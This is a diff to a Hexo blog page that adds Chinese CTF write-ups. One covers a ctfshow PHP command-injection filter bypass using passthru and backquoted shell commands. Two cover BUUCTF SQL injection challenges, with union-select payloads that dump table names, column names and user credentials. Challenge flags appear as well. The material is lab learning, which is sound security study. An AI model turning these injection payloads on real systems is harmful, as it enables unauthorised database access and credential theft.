@@ -11,7 +11,7 @@
   <meta name="description" content="3.25 wp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="3.25 wp">
-<meta property="og:url" content="http://example.com/2022/03/28/3-25-wp/index.html">
+<meta property="og:url" content="http://example.com/2022/03/28/sql%20qp/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="3.25 wp">
 <meta property="og:locale" content="en_US">
@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB70ff11734d8581326053b938832a7d31?method=download&shareKey=2b221f49ee906a1a6eb97ad70d4d6a0c">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBa8a6585ad74268e13da8976168b80d6f?method=download&shareKey=f0f39e4ceaf06763de26f0ae6576957a">
 <meta property="article:published_time" content="2022-03-28T11:17:14.000Z">
-<meta property="article:modified_time" content="2022-05-11T12:18:26.382Z">
+<meta property="article:modified_time" content="2022-09-10T04:37:34.395Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -163,7 +163,7 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-3-25-wp" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sql qp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -175,7 +175,7 @@
   
 
         
-        <a href="/2022/03/28/3-25-wp/" class="archive-article-date">
+        <a href="/2022/03/28/sql%20qp/" class="archive-article-date">
   	<time datetime="2022-03-28T11:17:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
 </a>
         
@@ -353,6 +353,79 @@
 </ol>
 <hr>
 <p>版权声明：本文为CSDN博主「OKAY_TC」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37964989">https://blog.csdn.net/qq_37964989</a></p>
+<h2 id="web萌新13"><a href="#web萌新13" class="headerlink" title="web萌新13"></a>web萌新13</h2><p>把file也给过滤了</p>
+<p>过滤了system, exec, highlight函数, cat命令, congfig, php, 点和分号等关键字, </p>
+<p>用反引号&#96;&#96; 绕过</p>
+<p>php中作为执行系统命令的函数有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反撇号</span><br></pre></td></tr></table></figure>
+
+<p>分号用?&gt;代替</p>
+<ol>
+<li><p>?c&#x3D;passthru(‘ls’)?&gt;</p>
+</li>
+<li><p>看大佬wp得   ?c&#x3D;passthru(“more <code>ls | grep con*</code>“)?&gt;</p>
+</li>
+<li><p>查资料得more命令就是查询内容</p>
+<p>​               grep命令在文本中查找指定的字符串</p>
+</li>
+<li><p>这个指令的意思就是查询config文件内容</p>
+</li>
+<li><p>执行，页面空白，看源代码</p>
+</li>
+<li><p>得ctfshow{799f6c1b-539c-477c-8da8-bea0692afb2e}</p>
+</li>
+</ol>
+<h2 id="buuctf-极客大挑战-2019-BabySQL"><a href="#buuctf-极客大挑战-2019-BabySQL" class="headerlink" title="buuctf-[极客大挑战 2019]BabySQL"></a>buuctf-[极客大挑战 2019]BabySQL</h2><ol>
+<li>万能密码 -1 or ‘1’&#x3D;’1’,报错：  You have an error in your SQL syntax; check the manual that corresponds  to your MariaDB server version for the right syntax to use near ‘1’ &#x3D;  ‘1’’ and password&#x3D;’-1  ‘1’ &#x3D; ‘1’’’ at line 1</li>
+<li>过滤掉了or ，直接删了or。改用 -1 oorr ‘1’&#x3D;’1’</li>
+<li>还是报错：You have an error in your SQL syntax; check the manual that corresponds  to your MariaDB server version for the right syntax to use <strong>near ‘1’ &#x3D;  ‘1’’ and password&#x3D;’-1 or ‘1’ &#x3D; ‘1’’’ at line 1</strong></li>
+</ol>
+<h2 id="极客大挑战-2019-LoveSQL1"><a href="#极客大挑战-2019-LoveSQL1" class="headerlink" title="极客大挑战 2019]LoveSQL1"></a>极客大挑战 2019]LoveSQL1</h2><ol>
+<li>测试 用户名输入1和1’不同，1‘报错</li>
+</ol>
+<p>You have an error in your SQL <strong>syntax;</strong> check the manual that corresponds to  your <strong>MariaDB</strong> server version for the right syntax to use near ‘1’’’ at  line 1                                     </p>
+<p>语法错误，数据库是:mariadb</p>
+<ol start="2">
+<li>1’ or 1&#x3D;1;#</li>
+</ol>
+<p>​        成功登入，密码为9bd7a645a4d70c1f164f343ab827256a</p>
+<ol start="3">
+<li>判断列数：&#x2F;check.php?username&#x3D;**1 ‘order by 3%23 **&amp;password&#x3D;1   %23是# 报错  ， 后来发现username&#x3D;admin  成功但没反应</li>
+<li>列数为4时报错：**Unknown column ‘4’ in ‘order clause’**说明共有3列</li>
+<li>判断显示位：check.php?username&#x3D;admin’ union select 1,2,3%23&amp;password&#x3D;1  页面和之前一样，也是成功           </li>
+<li>但是 check.php?username&#x3D;1’ union select 1,2,3%23&amp;password&#x3D;1 可以</li>
+</ol>
+<p>​            <strong>Hello 2！</strong></p>
+<p>​            <strong>Your password is ‘3’</strong>         回显 2，3列</p>
+<ol start="7">
+<li>1’union select 1,2,database()23%报错</li>
+</ol>
+<p>​            看wp应该是1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</p>
+<pre><code>group_concat() 用于一个集合显示括号里的信息。简单来说就是一个空（第3列）里显示多组信息。
+information_schema：简单来说就是数据库结构的集合，可以是表，列等等。这里后面接.tables就是数据库的表
+table_schema：数据库
+database（）：获取数据库信息的函数
+</code></pre>
+<p>​    这是获取表名，返回   <strong>Hello 2！</strong></p>
+<p>​                                          <strong>Your password is ‘geekuser,l0ve1ysq1’</strong></p>
+<p>​            两个表</p>
+<ol start="8">
+<li>第一个表字段   1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’geekuser’ and table_schema&#x3D;database()%23&amp;password&#x3D;1</li>
+</ol>
+<p>​                       <strong>“Your password is ‘id,username,password’ ”</strong></p>
+<ol start="9">
+<li><p>​      1’ union select 1,2,group_concat(id,username,password) from geekuser%23</p>
+<p>​        <strong>Your password is ‘1admin9bd7a645a4d70c1f164f343ab827256a’</strong></p>
+<p>​        </p>
+</li>
+<li><p>第二个表   1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’l0ve1ysq1’ and table_schema&#x3D;database()%23&amp;password&#x3D;1</p>
+</li>
+</ol>
+<p>​                返回结果和表1一样</p>
+<ol start="11">
+<li>1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</li>
+<li>flag{cf86a1c4-578e-468a-8cf9-5f3c6b8f0e4f}</li>
+</ol>
 
       
 
@@ -443,7 +516,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/28/3-25-wp/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/28/sql%20qp/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -467,8 +540,8 @@
     </a>
   
   
-    <a href="/2022/03/25/photo-test/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">photo test</div>
+    <a href="/2022/03/28/sql%20wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">3.25 wp</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -594,23 +667,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">html css</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">wp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">http</a>
+                <a href="javascript:void(0)" class="js-tag color4">html css</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">pentest</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">http</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -619,6 +688,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">share</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
              
               <li class="article-tag-list-item">
